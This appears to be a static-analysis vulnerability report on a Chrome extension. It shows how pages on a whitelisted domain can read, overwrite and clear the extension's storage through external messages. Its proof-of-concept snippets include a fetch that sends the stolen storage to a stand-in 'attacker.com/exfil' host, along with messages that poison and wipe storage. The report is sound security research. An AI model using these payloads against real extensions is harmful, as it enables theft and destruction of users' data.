# CoCo Analysis: jjjoiagdgjhecijlkfkipeilgfgbhkgc

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 10+ (multiple variations of storage read/write flows)

---

## Sink 1: storage_local_get_source → sendResponseExternal_sink (Information Disclosure)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jjjoiagdgjhecijlkfkipeilgfgbhkgc/opgen_generated_files/bg.js
Line 751-754 (CoCo framework code showing storage_local_get_source)

**Code:**

```javascript
// Background script (bg.js) - Line 989-1003: External message handler
chrome.runtime.onMessageExternal.addListener(
  function(request, sender, sendResponse) {
    console.log(">");

    // ... other handlers ...

    if (request.code == "get_from_web") {
      console.log("RECEIVED get_from_web", request.keys)

      chrome.storage.local.get(request.keys, function(items) {
        sendResponse(items);  // ← SINK: Storage data sent back to external caller
      });
    }

    // Line 1018-1041: Another information disclosure path
    else if (request.code == "get_chrx_progress") {
      console.log("RECEIVED get_chrx_progress")

      chrome.storage.local.get(null, function(items) {
        // Processes storage data
        var allKeys = Object.keys(items);
        var storage_vars = [];
        for (let key of allKeys) {
          if ((key.slice(0,2) == prefix) && (key.slice(-2) == "-n")) {
            storage_vars.push(key);
          }
        }

        var num_maps_complete = 0;
        for (let key of storage_vars) {
          let val = items[key];
          if (val > 0) {
            num_maps_complete += 1;
          }
        }
        sendResponse(num_maps_complete);  // ← SINK: Processed storage data sent back
      });
    }
  }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted domain (https://*.onionfist.com/*)

**Attack:**

```javascript
// From attacker-controlled page at https://attacker.onionfist.com/
chrome.runtime.sendMessage(
  'jjjoiagdgjhecijlkfkipeilgfgbhkgc',  // Target extension ID
  { code: 'get_from_web', keys: null },  // Request all storage data
  function(response) {
    console.log('Stolen storage data:', response);
    // Send to attacker server
    fetch('https://attacker.com/exfil', {
      method: 'POST',
      body: JSON.stringify(response)
    });
  }
);
```

**Impact:** Information disclosure vulnerability. An attacker controlling any subdomain of onionfist.com (per manifest.json externally_connectable: "https://*.onionfist.com/*") can send external messages to read arbitrary data from chrome.storage.local. The "get_from_web" handler accepts a `keys` parameter and returns the corresponding storage values via sendResponse, allowing the attacker to exfiltrate sensitive user data including game progress, settings, and any other data stored by the extension.

---

## Sink 2: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink (Storage Poisoning)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jjjoiagdgjhecijlkfkipeilgfgbhkgc/opgen_generated_files/bg.js
Line 1007	for (let key in request.obj) {
Line 1008	let val = to_num(request.obj[key]);

**Code:**

```javascript
// Background script (bg.js) - Line 1004-1016: Storage write handler
else if (request.code == "set_from_web") {
  console.log("RECEIVED set_from_web");
  var obj = {};
  for (let key in request.obj) {  // ← attacker-controlled request.obj
    let val = to_num(request.obj[key]);  // ← attacker-controlled values
    obj[key] = val;
  }
  console.log("OBJ", obj);

  chrome.storage.local.set(obj);  // ← SINK: Attacker data written to storage

  sendResponse();
}

// Line 1069-1090: Another storage write handler
else if (request.code == "overwrite_chrx") {
  console.log("RECEIVED overwrite_chrx");

  chrome.storage.local.clear(function() {
    var error = chrome.runtime.lastError;
    if (error) {
      console.error(error);
    }

    var obj = {};
    for (let key in request.new_data) {  // ← attacker-controlled request.new_data
      let val = to_num(request.new_data[key]);  // ← attacker-controlled values
      obj[key] = val;
    }
    console.log("OBJ", obj);
    chrome.storage.local.set(obj, function() {  // ← SINK: Attacker data written
      sendResponse();
    });
  });
}

// Line 1059-1068: Storage clear handler
else if (request.code == "clear_storage_data") {
  chrome.storage.local.clear(function() {  // ← SINK: Attacker can clear storage
    console.log("clear_storage_data SUCCESS");

    var obj = {};
    obj[prefix+"overwrite_web"] = true;
    chrome.storage.local.set(obj, function() {
      sendResponse();
    });
  });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted domain (https://*.onionfist.com/*)

**Attack:**

```javascript
// From attacker-controlled page at https://attacker.onionfist.com/
// Attack 1: Poison specific storage keys
chrome.runtime.sendMessage(
  'jjjoiagdgjhecijlkfkipeilgfgbhkgc',
  {
    code: 'set_from_web',
    obj: {
      'game_level': '999',
      'player_score': '9999999',
      'unlock_all': '1'
    }
  }
);

// Attack 2: Clear all storage and overwrite
chrome.runtime.sendMessage(
  'jjjoiagdgjhecijlkfkipeilgfgbhkgc',
  {
    code: 'overwrite_chrx',
    new_data: {
      'attacker_key': 'attacker_value',
      'compromised': 'true'
    }
  }
);

// Attack 3: Clear all user data
chrome.runtime.sendMessage(
  'jjjoiagdgjhecijlkfkipeilgfgbhkgc',
  { code: 'clear_storage_data' }
);
```

**Impact:** Storage poisoning vulnerability combined with information disclosure creates a complete storage exploitation chain. An attacker controlling any subdomain of onionfist.com can: (1) Write arbitrary key-value pairs to chrome.storage.local via "set_from_web" or "overwrite_chrx" handlers, (2) Read back all stored data via "get_from_web" handler with sendResponse, (3) Clear all user storage via "clear_storage_data" handler. This allows the attacker to manipulate game state, cheat scores, corrupt user data, or exfiltrate sensitive information. The complete read-write-clear access to storage makes this a severe vulnerability with full control over the extension's persistent data.
